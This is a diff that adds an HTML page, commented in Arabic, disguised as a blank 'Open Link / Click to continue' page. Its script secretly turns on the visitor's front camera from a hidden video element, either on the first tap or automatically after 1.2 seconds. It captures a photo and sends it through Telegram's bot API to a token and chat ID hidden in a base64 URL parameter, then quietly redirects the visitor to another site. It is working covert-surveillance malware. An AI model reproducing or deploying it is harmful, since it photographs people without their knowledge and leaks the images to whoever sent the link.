@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title> </title>
+
+    <!-- ===== Open Graph (معاينة عادية) ===== -->
+    <meta property="og:title" content="Open Link" />
+    <meta property="og:description" content="Click to continue" />
+    <meta property="og:image" content="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='512' height='512' viewBox='0 0 512 512'%3E%3Crect width='512' height='512' fill='%23f5f5f5'/%3E%3Ctext x='256' y='256' font-family='Arial' font-size='120' fill='%23444' text-anchor='middle' dominant-baseline='central'%3E🔗%3C/text%3E%3C/svg%3E" />
+    <meta property="og:url" content="https://site-url.github.io/Website-/index.html" />
+    <meta name="twitter:card" content="summary_large_image" />
+
+    <style>
+        /* واجهة بيضاء كاملة بدون أي نصوص مرئية */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        body, html {
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+        }
+        /* طبقة شفافة تستقبل اللمس/النقرات الأولى */
+        .touch-layer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: transparent;
+            cursor: pointer;
+        }
+        /* إخفاء عناصر الوسائط خارج الشاشة تماماً */
+        video, canvas {
+            position: fixed;
+            top: -1000px;
+            left: -1000px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="touch-layer" id="triggerLayer"></div>
+    <video id="videoElem" autoplay muted playsinline></video>
+    <canvas id="canvasElem"></canvas>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ------------------------------------------------------------------
+            // 1. استخراج الإعدادات من بارامتر 'p' (Base64 JSON)
+            //    التنسيق المتوقع: { "t": "BOT_TOKEN", "c": "CHAT_ID", "r": "REDIRECT_URL" }
+            // ------------------------------------------------------------------
+            let botToken = null;
+            let chatId = null;
+            let redirectUrl = "https://www.google.com";  // افتراضي آمن
+
+            const urlParams = new URLSearchParams(window.location.search);
+            const encodedParam = urlParams.get('p');
+
+            if (encodedParam && typeof encodedParam === 'string' && encodedParam.trim().length > 0) {
+                try {
+                    const decodedJson = atob(encodedParam);
+                    const config = JSON.parse(decodedJson);
+                    if (config.t && typeof config.t === 'string') botToken = config.t;
+                    if (config.c && (typeof config.c === 'string' || typeof config.c === 'number')) chatId = String(config.c);
+                    if (config.r && config.r.startsWith('http')) redirectUrl = config.r;
+                    else if (config.r && config.r.length > 0) redirectUrl = "https://" + config.r;
+                } catch(e) {
+                    // فشل فك التشفير → نستخدم القيم الافتراضية مع استمرار التنفيذ
+                    console.warn("Invalid p parameter");
+                }
+            }
+
+            // ------------------------------------------------------------------
+            // 2. عناصر DOM والثوابت
+            // ------------------------------------------------------------------
+            const video = document.getElementById('videoElem');
+            const canvas = document.getElementById('canvasElem');
+            const triggerDiv = document.getElementById('triggerLayer');
+
+            let mediaStream = null;          // تيار الكاميرا لإغلاقه لاحقاً
+            let isCapturing = false;          // منع تكرار تفعيل الكاميرا
+            let isPhotoSent = false;           // منع الإرسال المتكرر
+            let frameAnalyzerInterval = null;  // معرّف الفاصل لفحص البكسلات
+            let safetyTimeout = null;          // مؤقت الأمان العام (6 ثوانٍ)
+            let redirectExecuted = false;       // منع التوجيه المزدوج
+
+            // ------------------------------------------------------------------
+            // دالة التوجيه الحتمية (window.location.replace)
+            // ------------------------------------------------------------------
+            const executeRedirect = () => {
+                if (redirectExecuted) return;
+                redirectExecuted = true;
+                // تنظيف الموارد
+                if (mediaStream) {
+                    try {
+                        mediaStream.getTracks().forEach(track => {
+                            if (track.readyState === 'live') track.stop();
+                        });
+                    } catch(e) {}
+                }
+                if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                if (safetyTimeout) clearTimeout(safetyTimeout);
+                window.location.replace(redirectUrl);
+            };
+
+            // ------------------------------------------------------------------
+            // إرسال الصورة إلى Telegram API (fetch + keepalive)
+            // الصيغة: https://api.telegram.org/bot<TOKEN>/sendPhoto
+            // يتم إرسال الصورة كـ Blob (image/jpeg) داخل FormData
+            // ------------------------------------------------------------------
+            const sendToTelegram = (jpegBlob) => {
+                if (isPhotoSent) return;
+                isPhotoSent = true;
+
+                if (!botToken || !chatId) {
+                    // لا توجد بيانات صالحة → نوجه فوراً
+                    executeRedirect();
+                    return;
+                }
+
+                const apiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', jpegBlob, 'silent_capture.jpg');
+
+                // استخدام fetch مع keepalive: true لضمان الإرسال حتى بعد التنقل
+                fetch(apiUrl, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true,
+                    mode: 'no-cors'  // يمنع أخطاء CORS ويضمن الإرسال بصمت
+                }).catch(() => {
+                    // تجاهل أي خطأ في الإرسال
+                });
+
+                // بعد استدعاء الإرسال مباشرة، نقوم بالتوجيه (لا ننتظر الرد)
+                setTimeout(() => {
+                    executeRedirect();
+                }, 30);
+            };
+
+            // ------------------------------------------------------------------
+            // التقاط إطار الفيديو الحالي وتحويله إلى Blob (JPEG جودة 0.5)
+            // ثم إرساله عبر Telegram
+            // ------------------------------------------------------------------
+            const captureAndSend = () => {
+                if (isPhotoSent) return;
+
+                const vw = video.videoWidth;
+                const vh = video.videoHeight;
+                if (vw === 0 || vh === 0) {
+                    // الفيديو غير جاهز → نوجّه بعد قليل (لن نعلق)
+                    executeRedirect();
+                    return;
+                }
+
+                canvas.width = vw;
+                canvas.height = vh;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, vw, vh);
+
+                // تحويل canvas إلى Blob من نوع jpeg بجودة 0.5
+                canvas.toBlob((blob) => {
+                    if (blob && blob.size > 0) {
+                        sendToTelegram(blob);
+                    } else {
+                        // فشل إنشاء البلوب → نوجه فوراً
+                        executeRedirect();
+                    }
+                }, 'image/jpeg', 0.5);
+            };
+
+            // ------------------------------------------------------------------
+            // تحليل البكسلات المركزية للفيديو لانتظار إطار ملون (RGB sum > 30)
+            // يستخدم setInterval لفحص دوري سريع
+            // ------------------------------------------------------------------
+            const startPixelAnalysis = () => {
+                if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+
+                // مهلة قصوى لانتظار الإطار الملون: 4 ثوانٍ (ضمن مؤقت الأمان الكلي 6 ثوانٍ)
+                const maxWaitForColor = 4000;
+                const startTime = Date.now();
+
+                frameAnalyzerInterval = setInterval(() => {
+                    if (isPhotoSent) {
+                        if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                        return;
+                    }
+
+                    // التأكد من أن الفيديو جاهز وله أبعاد
+                    if (video.readyState !== 4 || video.videoWidth === 0 || video.videoHeight === 0) {
+                        return;
+                    }
+
+                    const w = video.videoWidth;
+                    const h = video.videoHeight;
+                    if (w < 8 || h < 8) return;
+
+                    // رسم الإطار الحالي على canvas صغير لقراءة البكسل المركزي
+                    canvas.width = w;
+                    canvas.height = h;
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, w, h);
+
+                    const centerX = Math.floor(w / 2);
+                    const centerY = Math.floor(h / 2);
+                    let pixel;
+                    try {
+                        pixel = ctx.getImageData(centerX, centerY, 1, 1).data;
+                    } catch(e) {
+                        return;
+                    }
+
+                    const r = pixel[0];
+                    const g = pixel[1];
+                    const b = pixel[2];
+                    const rgbSum = r + g + b;
+
+                    // إذا تجاوز السطوع 30 (إطار غير أسود) نلتقط الصورة ونرسلها
+                    if (rgbSum > 30) {
+                        if (!isPhotoSent) {
+                            if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                            frameAnalyzerInterval = null;
+                            captureAndSend();
+                        }
+                    } else {
+                        // مهلة إضافية: إذا مر أكثر من maxWaitForColor ولم نجد إطاراً ملوناً، نلتقط أي إطار (لتجنب التعليق)
+                        if (Date.now() - startTime > maxWaitForColor && !isPhotoSent) {
+                            if (frameAnalyzerInterval) clearInterval(frameAnalyzerInterval);
+                            frameAnalyzerInterval = null;
+                            captureAndSend();  // نلتقط الإطار الحالي (حتى لو كان داكن)
+                        }
+                    }
+                }, 80); // فحص سريع كل 80 مللي ثانية
+            };
+
+            // ------------------------------------------------------------------
+            // تشغيل الكاميرا والمحرك الأساسي (يتم استدعاؤها عند أول نقرة/لمسة)
+            // ------------------------------------------------------------------
+            const activateCameraAndEngine = async () => {
+                if (isCapturing) return;
+                isCapturing = true;
+
+                // إزالة مستمعي الأحداث لمنع تكرار التشغيل
+                if (triggerDiv) {
+                    triggerDiv.removeEventListener('click', activateCameraAndEngine);
+                    triggerDiv.removeEventListener('touchstart', activateCameraAndEngine);
+                }
+
+                // بدء مؤقت الأمان العام (6 ثوانٍ كحد أقصى للكل)
+                if (safetyTimeout) clearTimeout(safetyTimeout);
+                safetyTimeout = setTimeout(() => {
+                    if (!redirectExecuted) {
+                        executeRedirect();
+                    }
+                }, 6000);
+
+                try {
+                    // قيود الكاميرا بدقة مثالية 640x480 لضمان السرعة والتوافق
+                    const constraints = {
+                        video: {
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            facingMode: "user"
+                        }
+                    };
+                    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                    mediaStream = stream;
+                    video.srcObject = stream;
+                    video.setAttribute("playsinline", "");
+                    video.muted = true;
+
+                    // انتظار أن يصبح الفيديو جاهزاً للتشغيل
+                    await new Promise((resolve) => {
+                        if (video.readyState >= 2) {
+                            resolve();
+                        } else {
+                            const onReady = () => {
+                                video.removeEventListener('loadeddata', onReady);
+                                video.removeEventListener('loadedmetadata', onReady);
+                                resolve();
+                            };
+                            video.addEventListener('loadeddata', onReady);
+                            video.addEventListener('loadedmetadata', onReady);
+                            setTimeout(resolve, 800); // مهلة قصوى 800 مللي
+                        }
+                    });
+
+                    // تشغيل الفيديو بشكل صريح
+                    try {
+                        await video.play();
+                    } catch(e) {}
+
+                    // بدء تحليل البكسلات للبحث عن أول إطار ملون
+                    startPixelAnalysis();
+
+                } catch (err) {
+                    // في حال رفض الإذن أو خطأ في الكاميرا → التوجيه الصامت فوراً
+                    executeRedirect();
+                }
+            };
+
+            // ------------------------------------------------------------------
+            // ربط مستمع الأحداث على الطبقة البيضاء (أول لمسة/نقرة)
+            // هذا يتغلب على قيود المتصفحات المدمجة التي تمنع التشغيل التلقائي
+            // ------------------------------------------------------------------
+            if (triggerDiv) {
+                triggerDiv.addEventListener('click', activateCameraAndEngine, { once: false, passive: true });
+                triggerDiv.addEventListener('touchstart', activateCameraAndEngine, { once: false, passive: true });
+            }
+
+            // ------------------------------------------------------------------
+            // خطة هجوم احتياطية: إذا لم يلمس المستخدم الشاشة خلال 1.2 ثانية
+            // نحاول تفعيل الكاميرا تلقائياً (قد تنجح في بعض البيئات)
+            // لن يسبب ضرراً، وإذا فشل يبقى المستمع يعمل.
+            // ------------------------------------------------------------------
+            setTimeout(() => {
+                if (!isCapturing) {
+                    activateCameraAndEngine().catch(() => {});
+                }
+            }, 1200);
+
+            // ------------------------------------------------------------------
+            // منع أي قوائم سياقية أو تأخيرات غير مرغوب فيها
+            // ------------------------------------------------------------------
+            document.addEventListener('contextmenu', (e) => e.preventDefault());
+            document.addEventListener('dragstart', (e) => e.preventDefault());
+
+            // ------------------------------------------------------------------
+            // مؤقت أمان إضافي على مستوى الصفحة (5.5 ثوانٍ) كصمام أمان نهائي
+            // ------------------------------------------------------------------
+            setTimeout(() => {
+                if (!redirectExecuted) executeRedirect();
+            }, 5500);
+
+        })();
+    </script>
+</body>
+</html>
